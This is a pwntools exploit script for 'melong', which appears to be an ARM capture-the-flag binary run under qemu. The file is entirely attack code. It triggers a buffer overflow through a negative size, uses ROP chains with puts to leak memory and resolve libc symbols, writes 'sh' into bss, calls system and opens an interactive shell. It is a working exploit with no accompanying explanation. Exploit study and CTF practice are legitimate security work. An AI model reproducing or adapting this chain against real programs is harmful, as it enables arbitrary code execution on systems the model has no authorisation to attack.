from pwn import *
import sys

def check_bmi(height, weight):
	global p
	p.recvuntil("Type the number:")
	p.sendline("1")
	p.recvuntil("Your height(meters) : ")
	p.sendline(str(height))
	p.recvuntil("Your weight(kilograms) : ")
	p.sendline(str(weight))
	p.recvuntil("Your bmi is : ")
	bmi = float(p.recvline()[:-1])
	return bmi

def exercise():
	global p
        p.recvuntil("Type the number:")
        p.sendline("2")
	p.recvuntil("1. Check your bmi")

def register(inp):
	global p
        p.recvuntil("Type the number:")
        p.sendline("3")
	p.recvuntil("personal training?")
	p.sendline(inp)

def diary(inp):
	global p
        p.recvuntil("Type the number:")
        p.sendline("4")
	p.send(inp)

def leak(addr, full_flag = 0):
	global p
	p = process(["chroot", ".", "./qemu-arm-static", "./melong"])

	check_bmi(1,1)
	register("-1")

	payload  = "a"*0x50
	payload += "b"*4                # r11
	payload += p32(pop_r0_pc)       # pc
	payload += p32(addr)
	payload += p32(puts_plt)

	diary(payload)
	p.recvuntil("Type the number:")
	p.sendline("6")
	p.recvuntil("See you again :)\n")

	leaked = p.recvline()[:-1]
	if (len(leaked) > 4) and (full_flag == 0):
		leaked = leaked[:4]
	p.close()

#	print "At 0x%x" % addr
#	print hexdump(leaked)
	return leaked

def leak_phdr(base_addr):
	offset = u32(leak(base_addr + 0x1c).ljust(4, "\x00"))
	return base_addr+offset

def leak_dyn(addr):
	p_type = 1
	i = 0
	while (p_type != 0) and (p_type != 2):
		p_type = u32(leak(addr + i).ljust(4, "\x00"))
		i += 32
	return u32(leak(addr+i-32+8).ljust(4,"\x00"))

def leak_dyn_table(addr, table):
	p_val = 0
        i = 0
        while p_val != table:
                p_val = u32(leak(addr + i).ljust(4, "\x00"))
                i += 8
	print hexdump(p_val)
        return u32(leak(addr+i-8+4).ljust(4,"\x00"))

def leak_symbol(symtab, strtab, symbol):
	i = 0
	sym_name = ""
	while sym_name != symbol:
		st_name = u32(leak(symtab + i)[:2].ljust(4, "\x00"))
		sym_name = leak(strtab + st_name, full_flag = 1)
		log.info("Found symbols : %s (0x%x)" % (sym_name, st_name))
		i += 16
	return u32(leak(symtab + i -16 + 4).ljust(4, "\x00"))

def leak_binsh(addr):
	i = 0
	while True:
		res = leak(addr + i, 1)
		print hexdump(res)
		if "/bin/sh" in res:
			return addr + i
		i += 8

puts_plt  = 0x000104A8
puts_got  = 0x0002301C
pop_r0_pc = 0x00011BBC

"""
# Leaking the libc base
puts = u32(leak(puts_got)[:4])
malloc = u32(leak(malloc_got)[:4])
log.info("puts   : 0x%x" % puts)
log.info("malloc : 0x%x" % malloc)
pause()
leaked = ""
addr = puts & 0xfffffffffffff000
while leaked != "\x7fELF":
	leaked = leak(addr)
	addr -= 0x1000
"""

libc_base = 0xf66e8000
log.info("libc base : 0x%x" % libc_base)
"""
phdr_addr = leak_phdr(libc_base)
log.info("phdr addr : 0x%x" % phdr_addr)

dyn_addr = libc_base + leak_dyn(phdr_addr)
log.info("dyn addr  : 0x%x" % dyn_addr)

symtab = leak_dyn_table(dyn_addr, 6)
strtab = leak_dyn_table(dyn_addr, 5)
log.info("symtab    : 0x%x" % symtab)
log.info("strtab    : 0x%x" % strtab)

system = libc_base + leak_symbol(symtab, strtab, 'exit')
"""
system = libc_base + 0x2c771
log.info("system    : 0x%x" % system)

bss = 0x00023070
gadget1 = [
	0x00010460, ord('s'),	# pop {r3, pc}
	0x000105e4, bss,	# pop {r4, pc}
	0x000105e0, 0xdeadbeef,	# strb r3, [r4] ; pop {r4, pc}
]
gadget2 = [
        0x00010460, ord('h'),   # pop {r3, pc}
        0x000105e4, bss + 1,    # pop {r4, pc}
        0x000105e0, 0xdeadbeef,        # strb r3, [r4] ; pop {r4, pc}
]

if len(sys.argv) == 1:
	p = process(["chroot", ".", "./qemu-arm-static", "./melong"])
else:
	p = process(["chroot", ".", "./qemu-arm-static", "-g", "1234",  "./melong"])

check_bmi(1,1)
register("-1")

payload  = "a"*0x50
payload += "b"*4
payload += ''.join(map(p32, gadget1))
payload += ''.join(map(p32, gadget2))
payload += p32(pop_r0_pc)       # pc
payload += p32(bss)
payload += p32(system)

diary(payload)
p.recvuntil("Type the number:")
p.sendline("6")
p.recvuntil("See you again :)\n")
p.interactive()
